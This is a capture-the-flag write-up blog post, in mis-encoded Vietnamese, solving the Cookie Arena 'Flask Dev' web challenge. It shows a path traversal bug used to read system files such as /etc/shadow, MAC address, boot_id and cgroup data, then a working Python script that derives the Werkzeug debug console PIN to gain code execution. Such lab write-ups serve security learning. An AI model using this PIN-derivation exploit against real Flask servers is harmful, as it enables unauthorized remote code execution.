---
title: Write-Up Flask Dev
date: 2023-09-19 23:34:01 +0700
categories: [CTF, Cookie H√¢n Hoan, Write-Up]
tags: [web, write-up, ctf]     # TAG names should always be lowercase
---
ƒê·ªäA CH·ªà: [Flask Dev](https://battle.cookiearena.org/challenges/web/flask-dev)

## **Challenge Details**

The flask application is running in debug mode. Can you hack it?

(R·∫•t ng·∫Øn g·ªçn v√† s√∫c t√≠ch üôÇ).

## **Tags**

- Pin Code
- Flask
- Debug
- Remote Code Execution

## ****Web Analysis:****

T·∫°i `/` trang web:

Hi·ªÉn th·ªã r·∫•t l√† chi ti·∫øt d√≤ng chu·ªïi **`Hello !`** 

D√πng burpsuite b·∫Øt c≈©ng ƒë∆∞·ª£c 2 g√≥i tin kh√¥ng c√≥ g√¨ ƒë·∫∑c bi·ªát üôÇ

Nhi·ªám v·ª• l√† Remote Access Control (Ki·ªÉm so√°t quy·ªÅn truy c·∫≠p) ch·ªâ v·ªõi nhi√™u th√¥ng tin n√†y.

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled.png)

Sau khi m√≤ 77 49 kh√¥ng c√≥ th√¥ng tin g√¨ c√≥ th·ªÉ khai th√°c ƒë∆∞·ª£c tr√™n trang web m√¨nh ti·∫øn h√†nh s·ª≠ d·ª•ng c√°c tools Recon.

## RECON****:****

M√¨nh s·ª≠ d·ª•ng Scan tr√™n Burpsuite Pro ( b·∫°n n√†o ch∆∞a c√†i th√¨ ·ªü Blog m√¨nh c√≥ h∆∞·ªõng d·∫´n).

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%201.png)

M√¨nh th·∫•y `**/robots.txt**` ƒë·ªè nh∆∞ ch∆∞a t·ª´ng ƒë∆∞·ª£c ƒë·ªè.

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%202.png)

M√¨nh v√†o th√¨ th·∫•y n√≥ hi·ªán ra error v√† t√¨m file kh√¥ng th·∫•y. 
+1 IDEA: *T·∫°i v√¨ c√°i file ·ªü th∆∞ m·ª•c **`/`** n√≥ kh√¥ng c√≥ n√™n trang web b√°o l·ªói l√† **FileNotFoundError.** N·∫øu gi·∫£ s·ª≠ m√¨nh truy c·∫≠p v√†o ƒë√∫ng file ƒë√∫ng ƒë∆∞·ªùng d·∫´n th√¨ n√≥ s·∫Ω hi·ªán ra g√¨ ƒë√≥.* 

M√† giao di·ªán n√†y c√°c b·∫°n s·∫Ω th·ªânh tho·∫£ng th·∫•y c√°c challenge build t·ª´ flask python.

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%203.png)

T·∫°i d√≤ng bug n√†y c√≥ √¥ console nh∆∞ng n√≥ y√™u c·∫ßu nh·∫≠p PIN CODE ƒë√∫ng tags g·ª£i √Ω ƒë·ªÅ b√†i, v·∫≠y gi·ªù m√¨nh l√†m sao ƒë·ªÉ t√¨m ra PIN CODE.

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%204.png)

L√∫c n√†y m√¨nh quan s√°t th·∫•y n√≥ b√°o bug ·ªü 1 s·ªë ƒë∆∞·ªùng d·∫´n v√† m√¨nh th·ª≠ truy c·∫≠p xem ƒë∆∞·ª£c kh√¥ng.

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%205.png)

K·∫øt qu·∫£ v·∫´n kh√¥ng ƒë∆∞·ª£c.

M√† giao di·ªán ·ªü m·ªói trang web t·∫°i ƒë∆∞·ªùng d·∫´n `/` th∆∞·ªùng l√† /var/www/html ‚Üí /

N√™n vi·ªác m√¨nh truy c·∫≠p v√†o nh∆∞ v·∫≠y trang web s·∫Ω hi·ªÉu l√† `/var/www/html/usr/local/lib/python3.8/site-packages/flask/app.py`

N√™n h∆°i b·ªã sai sai‚Ä¶

B·∫Øt ƒë·∫ßu m√¨nh test th·ª≠ bug `LFI/Path Traversal`. ( L√∫c ƒë√≥ m√¨nh ki·∫øm g√¨ test ƒë·∫°i ch·ª© kh√¥ng c√≤n IDEA n√†o m·ªõi üò•). 

√Ä th∆∞·ªùng c√°c bug LFI th∆∞·ªùng c√≥ parameter ƒëi theo sau PATH ki·ªÉu ?param= m√† hi·ªán t·∫°i trang web n√†y kh√¥ng c√≥ n√™n m√¨nh test t·ª´ `/` 

Nh∆∞ng ch∆∞a k·ªãp TEST th√¨ con Burp Suite b√°o c√≥ l·ªï h·ªïng LFI lu√¥n :)) .

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%206.png)

C√≥ t∆∞∆°ng lai h∆°n r·ªìi ƒë√≥ üôÇ .

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%207.png)

`+1 user: cookiehanhoan`

Gi·ªù m√¨nh ti·∫øn h√†nh xem c√°c file trong h·ªá th·ªëng, m√† challenge n√†y kh√¥ng c√≥ source, nh∆∞ng l√∫c web b·ªã bug th√¨ l·ªô n√®.

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%208.png)

Xem th·ª≠

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%209.png)

T√®n ten, nh∆∞ng h∆°i d√†i m√¨nh copy qua VSCODE xem cho d·ªÖ. (kho·∫£ng 2215 d√≤ng ch·ªõ m·∫•y üòä)

Sau khi nh·ªù chatgpt ƒë·ªçc 77 49 l·∫ßn kh√¥ng c√≥ manh m·ªëi üòì 

M√¨nh ti·∫øn h√†nh search t·ª´ Kh√≥a ‚ÄúFLASK EXPLOIT, CONSOLE PIN CODE EXPLOIT PYTHON‚Ä¶‚Äù

Th√¨ c√≥ tr√™n trang HACKTRICK : [T·∫†I ƒê√ÇY](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) 

Th√¨ trong b√†i c√≥ ƒë·ªÉ l√† ‚ÄúB·∫†N C√ì TH·ªÇ ƒê·∫¢O NG∆Ø·ª¢C THU·∫¨T TO√ÅN V√Ä T·∫†O RA M√É PIN‚Äù T·ª´

`python3.5/site-packages/werkzeug/debug/__**init__**.py`

nh∆∞ng trang web l√† Python3.8 m√¨nh thay ƒë·ªói ƒë∆∞·ªùng d·∫´n v√† th·ª≠ xem file.(l·∫ßn n√†y ƒë·ª° h∆°n ch·ªâ c√≥ 534 d√≤ng).

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%2010.png)

D·ª±a theo trang Hacktrick th√¨ n√≥ d·ªÖ d√†ng h∆°n

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%2011.png)

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%2012.png)

Ta ƒëi t√¨m t·ª´ng manh m·ªëi.

- **M·∫£nh gh√©p s·ªë 1.**
    
    ![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%2013.png)
    
- **M·∫£nh gh√©p s·ªë 2.**
    
    ƒê·ªãa ch·ªâ MAC ta chuy·ªÉn l·∫°i th√†nh DECIMAL nha.
    
    `11820914965943`
    
    Tools: [CLICK](https://www.vultr.com/resources/mac-converter/)
    
    ![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%2014.png)
    

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%2015.png)

- **M·∫£nh gh√©p s·ªë 3.**
    
    M√¨nh th·ª≠ `/etc/machine-id` kh√¥ng ƒë∆∞·ª£c n√™n chuy·ªÉn sang `/proc/sys/kernel/random/boot_id`.
    
    `fe951ca9-6815-4da7-aec4-b5a04c351f34`
    
    ![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%2016.png)
    
    ![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%2017.png)
    
- **M·∫£nh gh√©p s·ªë 4.**
    
    ![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%2018.png)
    
    M√†
    
    ![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%2019.png)
    
    N√™n m√¨nh s·∫Ω l·∫•y t·ª´ ƒëo·∫°n ƒëu√¥i nha.
    
    11:devices:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod4a591b2c_0e3d_4645_84e8_bd29cb98e576.slice/`cri-containerd-c4da6254edaffec84c8d165a4286f05f82465ee33b88febc42f783d541306329.scope`
    
    ƒê·ªß m·∫£nh gh√©p r·ªìi ti·∫øn h√†nh EXPLOIT.
    

## EXPLOIT CONSOLE PIN CODE****:****

**K·∫æT H·ª¢P :**

- USER : `ROOT`
- MODNAME: `Flask.py`
- `getattr(app, '__name__', getattr (app .__ class__, '__name__'))` is **`Flask`**
- `getattr(mod, '__file__', None)` is the **absolute path of `app.py` : `/usr/local/lib/python3.8/site-packages/flask/app.py`**
- M·∫¢NH GH√âP 1
- M·∫¢NH GH√âP 2 : `11820914965943`
- M·∫¢NH GH√âP 3 : `fe951ca9-6815-4da7-aec4-b5a04c351f34`
- M·∫¢NH GH√âP 4 :  `cri-containerd-c4da6254edaffec84c8d165a4286f05f82465ee33b88febc42f783d541306329.scope`

Nh∆∞ng kh√∫c n√†y m√¨nh ƒë√£ ph·∫£i m·∫•t 2 ng√†y :)

K√©o l·∫°i l√™n tr√™n kh√∫c `/etc/shadow` m√¨nh c·ª© ng·ª° l√† user `cookiehanhoan` nh∆∞ng n√≥ l√† user `root` üôÇ

Nh·ªù s·ª± kh√°c bi·ªát n√†y.

C√°c user ƒë·ªÅu c√≥ d·∫•u ch·∫•m thang theo m√¨nh hi·ªÉu l√† n√≥ b·ªã permission c√≤n user root l√† all quy·ªÅn üôÇ

Thay ƒë·ªói v√† th√†nh c√¥ng üôÇ

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%2020.png)

**PALOAD :**

```python
import hashlib
from itertools import chain

probably_public_bits = [
    "root", # /etc/passwd
    "flask.app",
    "Flask",
    "/usr/local/lib/python3.8/site-packages/flask/app.py",
]

private_bits = [
    "11820914965943",  # MAC -> int /sys/class/net/eth0/address
    "fe951ca9-6815-4da7-aec4-b5a04c351f34cri-containerd-c4da6254edaffec84c8d165a4286f05f82465ee33b88febc42f783d541306329.scope"
        # /proc/sys/kernel/random/boot_id + /proc/self/cgroup
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

rv = None
num = None

if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x: x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)
```

Ch·ªï d√†i n√†y l√† M·∫£nh gh√©p 3 + 4 m√¨nh c√≥ ƒë·ªÉ tag ghi ch√∫.

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%2021.png)

RUN CODE

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%2022.png)

L√∫c n√†y ta c√≥ m√£ Pin r·ªìi.

Nh·∫≠p th·ª≠

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%2023.png)

Truy c·∫≠p v√† /console

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%2024.png)

L√∫c n√†y c√≥ 1 terminal c√≥ th·ªÉ th·ª±c thi code python gi·ªù m√¨nh g·ªçi h√†m system v√† xem file 

![Untitled](/assets/writeup/cookie/FlaskDev/Untitled%2025.png)

DONEEE üôÇ B√†i n√†y kh√° ph√™‚Ä¶ t·ªën th·ªùi gian t·∫≠n m·∫•y ng√†y :))

C·∫£m ∆°n ƒë√£ ƒë·ªçc blogs c·ªßa m√¨nh n·∫øu th·∫•y hay nh·ªõ nh·∫≠n x√©t gi√∫p m√¨nh [·ªü ƒë√¢y n√®](https://github.com/r2nw/r2nw.github.io/issues/3), ƒë·ªÉ m√¨nh bi·∫øt c·∫£i th√™m ch·∫•t l∆∞·ª£ng write up.

THANK YOU üòó